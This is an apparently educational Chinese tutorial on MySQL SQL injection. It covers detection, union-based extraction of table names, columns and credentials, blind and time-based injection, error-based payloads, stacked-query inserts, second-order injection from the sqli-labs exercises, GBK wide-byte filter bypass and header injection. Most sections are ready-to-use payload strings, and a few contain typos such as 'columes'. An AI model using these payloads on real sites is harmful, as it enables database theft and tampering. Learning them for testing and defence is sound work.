**sql漏洞基础**

## 一、漏洞发现

手工测试：

通过可控参数输入点进行sql语句闭合测试：

    
    
    and 1=1; and 1=2; and 0x1=0x1; or 1=1;
    

在and给定一个true条件语句观察数据产生情况(应用不注入情况相同)，在and后给定一个false语句观察产生情况(应无法产生正常数据，也就是所谓的报错)

使用工具：

使用sqlmap脚本工具进行漏洞点测试。

## 二、常见sql漏洞

### 1\. 字符型注入漏洞

字符型漏洞表示可控参数点的值为**’字符串‘ **形式，在进行闭合参数进行漏洞测试时需要闭合字符串中的**
单引号’**，语句如下(因为本身还存在一个'，所以需要使用注释对引号及后续代码进行注释)：

    
    
    id = '1' and 1=1 #'
    

### 2\. 数字型注入漏洞

很显然，数字型即为可控的参数点参数为整形参数，在输入时可以不需要考虑对**单引号‘**的闭合问题！但是要考虑后续的代码，需要使用注释语句对后续代码进行注释。

    
    
    id = 1 and 1=1 #
    

### 3\. 搜索型注入漏洞

搜索型，顾名思义即为在搜索框内输入注入语句的一种注入情况。一般情况搜索框中使用关键词进行搜索，反应在mysql语句中即为。

    
    
    select * from table where name like '%para%'
    

此时的注入需要闭合 **百分号% **和** 单引号’**，漏洞测试语句

    
    
    para%' and 1=1 and '%' = '   或者 and 1=2，对应sql语句为：
    select * from table where name = '%para%' and 1=1 and '%' = '%'
    

## 三、简单漏洞利用

这里只说明对于mysql的手工漏洞利用。

### 1.手工注入常规思路

>   1. 判断是否存在漏洞，以及漏洞的类型是字符型、数字型还是搜索型
>
>   2. 猜测sql语句中的查询字段数：通常使用 order by N ，使用分组方式进行字段数查询，当查询的N大于当前查询字段数时会报错。
>
>   3. 爆出当前查询显示的字段：select 1,2,3....
>
>   4. 获取当前数据库的库名：database()
>
>   5. 获取数据库中的表名
>
>   6. 获取数据库中的列名
>
>   7. 最后获取数据库中的数据
>
>

### 2.mysql数据库特殊情况

当mysql版本>5.0时，数据库中存在information_schema表

### 3.漏洞利用语句

利用语句一般使用在判断 and 1=1处，替换and 1=1。

#### 联合注入union语句,使用group_concat合并所有得到的结果

    
    
    #获取表名：
    union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database())
    
    #获取列名
    union select 1,(select group_concat(column_name) from information_schema.columes where table_schema = database() and table_name = '上文爆出的表名')
    
    #获取数据名
    union select 1,(select group_concat(username,password) from `上文爆出的表名`)
    

#### boolean布尔型盲注入语句

盲注入表示：再插入注入语句后，前台不会返回相应的字段结果，使用原理就是判断所查询的数据与对应表名/列名是否相等，作为一个判断语句插入到and后，如果为true，则返回界面与之前相同，否则会产生报错。

    
    
    and if (substring((select table_name from information_schema.tables where table_schema = database() limit 1,0),1,1)='所判断字符',判断为真返回的值,判断为假返回的值)
    

**substring(str,begin,step)** ：

表示截取字符串str从begin(字符串下标从零开始)开始的step个字符，使用字符串截取函数，必须保证传入的字串参数只有一条，所以限制了查询语句，limit
setp,begin

#### 报错注入语句

当输入错误sql信息时，界面如果会显示sql语句报错那么就可以使用报错注入语句，php中使用了mysql_error()函数会产生报错注入：

    
    
    #常用攻击语句
    and info--+  #原理会显示当前库不存在这个函数，从而爆出库名
    
    and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+
    
    and (extractvalue(1,concat(0x7e,(select user()),0x7e))--+ #与updatexml原理相同
    
    and (select 1 from 
         (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)
         #floor()报错原理：在使用group by建立虚拟分组表时，rand函数在每次建立和插入数值都变化（011011..），当第四次访问虚拟表	时，0不存在，则建立新值，但是当插入时再次访问rand后值变为1，原虚拟表中存在key为1的值，所以再插入时出现key冗余报错！
    
    and exp(~(select * from (select user())a))
    	#exp()报错原理：（~：二进制各位取反符号）使用数值溢出报错。select查询成功后返回0，对0按位取反	得到计算机中最大值，在进行e的指数运算，从而达到数值溢出效果
    
    #非常用攻击语句（用于绕过waf，有版本限制）
    geometrycollection(); mulitpoint(); polygon(); mulitpolygon(); linstring(); multilinestring()
    

**大部分报错语句产生的结果都会存在长度限制，但是** floor() **报错语句没有长度显示**

#### 插入更新注入语句(insert 、updata)

插入语句的注入有两种方式：

  1. 当SQL语句产生错误是，存在报错提示信息可以使用：

    
    
    #insert报错注入
    'or (任意一个报错语句) or' #把该语句插入到需要插入字符型的参数中
    

  2. 也可以从输入部分a向其他部分b插入核心数据：

    
    
    paraA',user())#     #语句表示将最后一个插入字段插入数据库数据
    

  3. Insert盲注（不推荐使用，会产生大量垃圾数据）：

    
    
    #当插入点为int行时，可以使用+,-运算符进行：
    insert into user values (2+if((substr((select user()),1,1)='r'),sleep(5),1),'1',"admin");
    
    #当插入点为字符型时，使用字符串拼接 + ：
    insert into user values (4,''+if((substr((select user()),1,1)='p'),sleep(5),1)+'',"admin");
    

更新语句的注入方式：

  1. 更新语句的注入方式同插入相同，需要存在报错信息

    
    
    'or (任意一个报错语句) or' #把该语句插入到需要插入字符型的参数中
    

  2. 当我们知道更新语句中的字段号时，则可以类似于insert语句，构造其他参数。

    
    
    paraA', name=user()#
    

  3. #### 删除语句的注入语句(delete)  
删除语句也是通过产生报错进行爆出数据的：

    
    
    61+and+updatexml(1,(concat(0x7e,user(),0x7e)),0)
    

### 4.进阶注入攻击语句

#### 布尔盲注之时间注入

时间注入又称延时注入，顾名思义，就是当注入语句为true时产生时间延迟，从而进行数据爆出。通过数据返回的延时时间来判断是否语句的true与false。

mysql中时间注入使用到三个函数：if()，sleep()，substring()

    
    
    #判断数据库长度
    if(length(database()>N,sleep(5),0))
    
    #判断数据库核心数据
    if((查询数据语句)='字符字典',sleep(5),0)
    

#### 堆叠注入攻击语句

堆叠，顾名思义即为可以一次进行多个查询语句，语句之间使用(;)进行隔开。

 **注意！** ：堆叠注入在使用查询时，只能返回第一个查询语句的值，后续的查询语句可以说无效。所以使用堆叠注入一般都说是进行增加或删除数据库中的数据。

在php+mysql中使用了mysqli_multi_query()和mysql_multi_query()两个函数对数据库进行操作时，存在堆叠注入攻击漏洞。

    
    
    #在进行堆叠注入攻击进行插入删除时，往往先进行常规注入，爆出库名，表名和列名
    #再根据爆出的库表列名进行插入或者删除数据
    id=-999';insert into users(id,username,password)values(1000,'f1o0d','123456')--+
    

#### 二次注入攻击语句

二次注入，顾名思义，就是对语句进行第二次注入，即当输入数据被后台进行了特殊数据的转义过滤（php开启gpc，使用addslashes函数），但是在数据库存储数据时并没有将转义后的数据进行存储。

当再次访问数据库中信息时，由于数据带有特殊符号则会发生sql注入

![image](https://image.3001.net/images/20211112/1636685086_618dd51e784928a06b6e4.png!small)

    
    
    #在sqli-24关中
    1.在注册用户名时输入，admin'#
    2.在修改admin'#用户的密码时产生如下语句：
    update user set password='输入值' where username = 'admin'#' password = '随便写被注释了'
    

#### 宽字节注入（ctf中常见）

在sql防护中往往会开启gpc对特殊字符进行过滤，但是如果数据库的编码设置不对时，则可以绕过gpc过滤，当数据库编码设置为gbk时会产生宽字节注入。

    
    
    mysql_query("set names gbk")  #设置数据库编码为gbk
    

宽字节编码：

在特殊字符过滤中一般将单引号' **过滤为** \'**。

单引号‘的gbk编码：%27 反斜号\的gbk编码：%5c。

因为gbk采用多字节解析sql语句，所以会将两个连续编码看作是一个进行识别：

    
    
    %df%27===(特殊字符转义)===>%df%5c%27===(数据库 GBK)===>運'
    

攻击语句：

    
    
    -1%df%27 and 1=1--+    #查看页面是否存在乱码
    -1%df%27 or sleep(10)--+    #查看页面是否存在延时
    

#### HTTP头部注入

http头部信息中，也会存在一些与数据库交互的参数。例如：cookie，xxf等。这些参数都可以利用上述注入说明进行注入测试。

